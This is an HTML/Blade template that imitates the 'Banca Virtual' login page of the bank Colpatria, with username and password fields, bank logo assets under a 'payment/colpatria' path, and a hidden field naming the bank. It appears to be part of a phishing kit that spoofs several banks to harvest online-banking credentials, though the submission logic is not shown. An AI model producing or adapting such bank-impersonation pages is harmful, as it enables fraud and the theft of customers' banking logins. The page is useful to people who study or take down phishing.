<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="csrf-token" content="{{ csrf_token() }}">


	

    <title>Colpatria</title>
    <style>
        *{
            font-family: Arial, Helvetica, sans-serif;
            margin: 0;
            padding: 0;
        }
    </style>

    <script type="text/javascript" src="{{asset('assets/js/jquery-3.6.0.min.js')}}"></script>		


</head>
<body>
    <div style="border-top:5px solid red; border-bottom:1px solid #dcdcdc; height:60px;">
    <img src="{{asset('assets/img/payment/colpatria/logo.png')}}" alt="" srcset="" width="25%" style="margin-top:-20px; margin-left:20px;">
    </div>
<br><br>
    <center><h2>Ingresa a tu Banca Virtual</h2></center>



<br><br><br>

        <img src="{{asset('assets/img/payment/colpatria/usuario.png')}}" alt="" srcset="" width="5%" style="position:absolute; margin-top:8px; margin-left:25px;">
        <img src="{{asset('assets/img/payment/colpatria/candado.png')}}" alt="" srcset="" width="5%" style="position:absolute; margin-top:100px; margin-left:25px;">
      <center>  <input type="text" name="" id="txtUsuario" placeholder="Nombre de usuario" style="width:80%; padding-left:30px; height: 40px; border:none; border-bottom:1px solid gray; font-size:17px;" oninput="this.value = this.value.replace(/\s+/g, '')" required><br><br><br><br>


     

        <input type="password" name="documento" id="txtPass" placeholder="Contraseña" style="width:80%; padding-left:30px; height: 40px; border:none; border-bottom:1px solid gray; font-size:17px;" oninput="this.value = this.value.replace(/\D+/g, '');" required></center><br>
        <a style="color:#219fd6; margin-left:20px;"><b>¿Necesitas ayuda para ingresar?</b></a><br><br>
        <input type="hidden" value="colpatria" id="banco">

       <center> <input type="submit" name="clave" id="btnUsuario"  value="Ingresar"  style="width:90%; height:45px; border-radius:5px; background-color:red; color:white; border:none;"><br><br><br></center>
        <h3 style="margin-left:20px;">¿No te has registrado?</h3><br>
		
        <center><input type="submit" value="Registrate aquí" style="width:90%; height:45px; border-radius:5px; background-color:white; color:red; border:1px solid red;"></center>


</body>
</html>